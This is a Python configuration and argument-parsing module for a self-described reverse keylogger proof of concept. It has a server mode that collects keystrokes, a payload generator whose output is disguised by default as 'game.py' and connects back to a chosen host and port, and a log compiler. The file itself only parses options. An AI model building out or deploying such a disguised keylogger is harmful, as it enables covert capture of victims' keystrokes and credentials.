import argparse

class KeyloggerConfig:
    """
    Configuration management class for the keylogger application
    Handles command line arguments parsing and stores application settings
    """
    
    def __init__(self):
        # Initialize default configuration values
        self.host = "0.0.0.0"
        self.port = None
        self.mode = None
        self.file_path = None
        self.payload_name = "game.py"
        self.enable_output_file = False
        self.keylogger_file = None
        self.input_log_file = None  # New: for log compiler mode
        self.output_compiled_file = None  # New: for log compiler mode
    
    def parse_arguments(self):
        """
        Parse command line arguments using argparse
        Provides automatic validation, help generation, and error handling
        """
        parser = argparse.ArgumentParser(
            description="Reverse Keylogger Proof of Concept - Educational Use Only",
            epilog="Example usage:\n  python main.py -M CP -H 192.168.1.100 -p 4444\n  python main.py -M SM -H 0.0.0.0 -p 4444 -o keystrokes.log\n  python main.py -M LC -i keystrokes.log -o compiled.txt"
        )
        
        # Define command line arguments with validation
        parser.add_argument("-M", "--mode", required=True, choices=["SM", "CP", "LC"],
                        help="Operation mode: SM (Server Mode), CP (Create Payload), or LC (Log Compiler)")
        
        parser.add_argument("-H", "--host", default="0.0.0.0",
                        help="Host address for binding (server) or connecting (payload). Default: 0.0.0.0")
        
        parser.add_argument("-p", "--port", type=int,
                        help="Port number for communication (required for SM/CP modes, range: 1-65535)")
        
        parser.add_argument("-n", "--name", default="game.py",
                        help="Output filename for the generated payload. Default: game.py")
        
        parser.add_argument("-o", "--output",
                        help="Output file (for SM: save keystrokes, for LC: save compiled log)")
        
        parser.add_argument("-i", "--input",
                        help="Input log file to compile (required for LC mode)")
        
        # Parse arguments and store values
        args = parser.parse_args()
        
        # Assign parsed values to configuration
        self.mode = args.mode
        self.host = args.host
        self.port = args.port
        self.payload_name = args.name
        
        # Enable file output if output file is specified
        if args.output:
            self.file_path = args.output
            self.enable_output_file = True
        
        # For log compiler mode
        if args.input:
            self.input_log_file = args.input
        if args.output and self.mode == "LC":
            self.output_compiled_file = args.output